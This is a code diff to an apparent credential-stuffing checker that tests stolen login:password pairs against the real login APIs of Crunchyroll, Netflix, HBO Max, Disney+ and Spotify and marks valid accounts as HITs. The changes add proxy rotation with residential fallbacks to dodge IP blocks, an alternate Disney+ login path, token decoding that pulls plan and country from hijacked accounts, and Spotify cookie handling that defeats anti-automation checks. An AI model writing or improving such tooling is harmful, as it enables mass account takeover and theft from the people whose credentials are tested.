@@ -30,7 +30,7 @@ function curlExitLabel(code: number | null | undefined): string {
     35: "SSL_CONNECT_ERROR",    51: "PEER_CERT_INVALID",  52: "GOT_NOTHING",
     53: "SSL_ENGINE_NOT_FOUND", 56: "RECV_ERROR",         58: "LOCAL_CERT_PROBLEM",
     60: "SSL_CACERT_VERIFY",    77: "SSL_CACERT_BADFILE", 78: "RESOURCE_NOT_FOUND",
-    97: "HTTP3_ERROR",          98: "QUIC_CONNECT_ERROR",
+    95: "HTTP3_ERROR",          96: "QUIC_CONNECT_ERROR", 97: "PROXY_ERR",          98: "SSL_CLIENT_CERT",
   };
   return code != null && labels[code] ? `CURL_${code}:${labels[code]}` : `CURL_ERR_${code ?? "?"}`;
 }
@@ -1355,16 +1355,24 @@ const CR_TIMEOUT     = 25_000;
 
 async function checkCrunchyroll(login: string, password: string): Promise<CheckResult> {
   const credential = `${login}:${password}`;
+  const crArgs = (px: string[]) => [
+    "--compressed", "--http1.1", "-L", "--max-redirs", "3",
+    ...px,
+    "-H", `User-Agent: ${CR_UA}`,
+    "-H", `Authorization: Basic ${CR_CLIENT_B64}`,
+    "-H", "Content-Type: application/x-www-form-urlencoded",
+    "--data-raw", `grant_type=password&username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}&scope=offline_access`,
+    "https://auth.crunchyroll.com/auth/v1/token",
+  ];
   try {
-    const result = await runCurlWithProxyRetry(px => [
-      "--compressed", "-L", "--max-redirs", "3",
-      ...px,
-      "-H", `User-Agent: ${CR_UA}`,
-      "-H", `Authorization: Basic ${CR_CLIENT_B64}`,
-      "-H", "Content-Type: application/x-www-form-urlencoded",
-      "--data-raw", `grant_type=password&username=${encodeURIComponent(login)}&password=${encodeURIComponent(password)}&scope=offline_access`,
-      "https://auth.crunchyroll.com/auth/v1/token",
-    ], CR_TIMEOUT, 3);
+    // Try public proxies first (3 attempts), then fall back to residential
+    let result: CurlResult;
+    try {
+      result = await runCurlWithProxyRetry(crArgs, CR_TIMEOUT, 3);
+    } catch (proxyErr) {
+      // Public proxies failed (PROXY_ERR) — fall back to residential
+      result = await runCurlResidential(crArgs, CR_TIMEOUT);
+    }
 
     if (result.statusCode === 200 && result.body.includes("access_token")) {
       let detail = "authenticated";
@@ -1460,9 +1468,10 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
     });
     let postResult: CurlResult;
     try {
-      postResult = await runCurlResidential(px => [
+      // Try direct connection first — residential proxy was returning 403.
+      // If direct gets 421 (datacenter IP rejected), fall through to proxy retry.
+      postResult = await runCurl([
         "--compressed", "--http1.1", "-L", "--max-redirs", "3",
-        ...px,
         "-b", cookieFile, "-c", cookieFile,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Content-Type: application/json",
@@ -1473,6 +1482,22 @@ async function checkNetflix(login: string, password: string): Promise<CheckResul
         "--data-raw", nfBody,
         `https://www.netflix.com/api/shakti/${buildId}/login`,
       ], NF_TIMEOUT);
+      // If direct IP is geo-blocked (421), retry with proxy
+      if (postResult.statusCode === 421 || postResult.statusCode === 403) {
+        postResult = await runCurlWithProxyRetry(px => [
+          "--compressed", "--http1.1", "-L", "--max-redirs", "3",
+          ...px,
+          "-b", cookieFile, "-c", cookieFile,
+          "-H", `User-Agent: ${DESKTOP_UA}`,
+          "-H", "Content-Type: application/json",
+          "-H", "Referer: https://www.netflix.com/br/login",
+          "-H", "Origin: https://www.netflix.com",
+          "-H", "Accept: application/json, text/javascript",
+          "-H", "X-Netflix.is.user.unauthenticated: true",
+          "--data-raw", nfBody,
+          `https://www.netflix.com/api/shakti/${buildId}/login`,
+        ], NF_TIMEOUT, 4);
+      }
     } catch (e) {
       return { credential, login, status: "ERROR", detail: `POST_ERROR:${String(e)}` };
     }
@@ -1638,7 +1663,9 @@ async function checkHBOMax(login: string, password: string): Promise<CheckResult
       client_id:  MAX_CLIENT_ID,
     });
 
-    const result = await runCurlResidential(px => [
+    // api.max.com is geo-blocked from datacenter IPs — try rotating proxies.
+    // runCurlWithProxyRetry uses public SOCKS5/HTTP proxies first, then residential fallback.
+    const result = await runCurlWithProxyRetry(px => [
       "--compressed", "-L", "--max-redirs", "3",
       ...px,
       "-H", `User-Agent: ${HBO_UA}`,
@@ -1646,7 +1673,7 @@ async function checkHBOMax(login: string, password: string): Promise<CheckResult
       "-H", "Accept: application/json",
       "--data-raw", payload,
       "https://api.max.com/v1/oauth/token",
-    ], HBO_TIMEOUT);
+    ], HBO_TIMEOUT, 3);
 
     if (result.statusCode === 200 && result.body.includes("access_token")) {
       let detail = "max_authenticated";
@@ -1748,9 +1775,59 @@ async function checkDisneyPlus(login: string, password: string): Promise<CheckRe
     let accessToken = "";
     try { const j = JSON.parse(tokResult.body); accessToken = j.access_token ?? ""; } catch { /**/ }
     if (!accessToken) {
-      const tok = tokResult.body.slice(0, 100);
-      if (tok.includes("unsupported_grant_type"))
-        return { credential, login, status: "ERROR", detail: "DISNEY_API_CHANGED:unsupported_grant_type" };
+      const tok = tokResult.body.slice(0, 150);
+      if (tok.includes("unsupported_grant_type")) {
+        // /token endpoint changed grant type — try /v1/public/guest/login directly
+        // with email+password and the anonymous key (skip device registration token step)
+        let directResult: CurlResult;
+        try {
+          directResult = await runCurl([
+            "--compressed", "-L", "--max-redirs", "3",
+            "-H", "Content-Type: application/json",
+            "-H", `User-Agent: ${DISNEY_UA}`,
+            "-H", `Authorization: Bearer ${DISNEY_ANON_KEY}`,
+            "--data-raw", JSON.stringify({ email: login, password, applicationRuntime: "android" }),
+            `${DISNEY_BASE}/idp/v4/guest/login`,
+          ], DISNEY_TIMEOUT);
+        } catch (e) {
+          return { credential, login, status: "ERROR", detail: `DISNEY_API_CHANGED:${String(e)}` };
+        }
+        const dBody = directResult.body;
+        const dLow  = dBody.toLowerCase();
+        if (directResult.statusCode === 200 && (dBody.includes("access_token") || dBody.includes("token_type"))) {
+          let detail = "disney_authenticated";
+          try {
+            const j = JSON.parse(dBody) as Record<string, unknown>;
+            const info: string[] = [];
+            if (typeof j.access_token === "string") {
+              const pad   = (s: string) => s + "=".repeat((4 - s.length % 4) % 4);
+              const parts = (j.access_token as string).split(".");
+              const pay   = JSON.parse(Buffer.from(pad(parts[1]), "base64").toString("utf8")) as Record<string, unknown>;
+              const sub   = (pay.sub ?? pay.upid ?? pay.userId ?? "") as string;
+              const tier  = (pay.subscriptionType ?? pay.tier ?? pay.entitlements ?? "") as string;
+              const region= (pay.region ?? pay.country ?? "") as string;
+              if (sub)    info.push(`uid:${String(sub).slice(0, 30)}`);
+              if (tier)   info.push(`plano:${String(tier).slice(0, 25)}`);
+              if (region) info.push(`país:${region}`);
+            }
+            if (info.length) detail = info.join(" | ");
+          } catch { /**/ }
+          return { credential, login, status: "HIT", detail };
+        }
+        if (directResult.statusCode === 401 || directResult.statusCode === 400) {
+          let detail = "invalid_credentials";
+          try {
+            const j = JSON.parse(dBody) as Record<string, unknown>;
+            const err = j.error as Record<string, unknown> | undefined;
+            const e = err?.code ?? (j.errors as Record<string, unknown>[])?.[0]?.code ?? j.error ?? "";
+            if (e) detail = String(e).slice(0, 60);
+          } catch { /**/ }
+          return { credential, login, status: "FAIL", detail };
+        }
+        if (dLow.includes("account_not_found") || dLow.includes("user_not_found"))
+          return { credential, login, status: "FAIL", detail: "account_not_found" };
+        return { credential, login, status: "ERROR", detail: `DISNEY_FALLBACK_ERR:${directResult.statusCode}:${dBody.slice(0, 80)}` };
+      }
       return { credential, login, status: "ERROR", detail: `NO_TOKEN:${tokResult.statusCode}:${tok}` };
     }
 
@@ -2292,16 +2369,20 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
       return { credential, login, status: "ERROR", detail: `GET_HTTP_${getResult.statusCode}` };
     }
 
-    // Extract CSRF token from cookie jar.
-    // Spotify 2024+: cookie is "sp_sso_csrf_token" (tab-separated Netscape format).
-    // Older format: "csrf_token".  Both match /csrf_token\s+(\S+)/ because the new name
-    // ends with "csrf_token" and the tab following it is matched by \s+.
+    // Extract CSRF token and session SID from cookie jar (Netscape tab-separated format).
+    // Spotify 2024+: "sp_sso_csrf_token" is the CSRF token sent in the POST body.
+    // "__Host-sp_csrf_sid" is a new session-binding cookie required since late 2024.
+    // curl may not automatically send __Host- prefixed cookies from the jar (host-strict
+    // attribute) — so we extract and inject it explicitly via -b.
     let csrfToken = "";
+    let spCsrfSid = "";
     try {
       const jar = readFileSync(cookieFile, "utf8");
-      // Match both sp_sso_csrf_token and csrf_token cookie names
-      const m = jar.match(/(?:sp_sso_)?csrf_token\t(\S+)/);
-      if (m) csrfToken = m[1];
+      const mCsrf = jar.match(/(?:sp_sso_)?csrf_token\t(\S+)/);
+      if (mCsrf) csrfToken = mCsrf[1];
+      // Extract __Host-sp_csrf_sid — the tab-separated name is the last field before value
+      const mSid = jar.match(/__Host-sp_csrf_sid\t(\S+)/);
+      if (mSid) spCsrfSid = mSid[1];
     } catch { /**/ }
 
     if (!csrfToken) {
@@ -2326,13 +2407,17 @@ async function checkSpotify(login: string, password: string): Promise<CheckResul
     // Inject a random one to satisfy the server-side session check.
     const spKey = randomUUID();
 
+    // Build explicit cookie string — curl may skip __Host- cookies from the jar
+    // due to strict host-attribute handling.  Inject them directly via -b header.
+    const extraCookies = [`sp_key=${spKey}`, ...(spCsrfSid ? [`__Host-sp_csrf_sid=${spCsrfSid}`] : [])].join("; ");
+
     let postResult: CurlResult;
     try {
       // Direct connection — residential proxy blocks accounts.spotify.com CONNECT tunnel
       postResult = await runCurl([
         "--compressed", "-X", "POST",
         "-b", cookieFile, "-c", cookieFile,
-        "-b", `sp_key=${spKey}`,
+        "-b", extraCookies,
         "-H", `User-Agent: ${DESKTOP_UA}`,
         "-H", "Content-Type: application/x-www-form-urlencoded",
         "-H", "Accept: application/json",
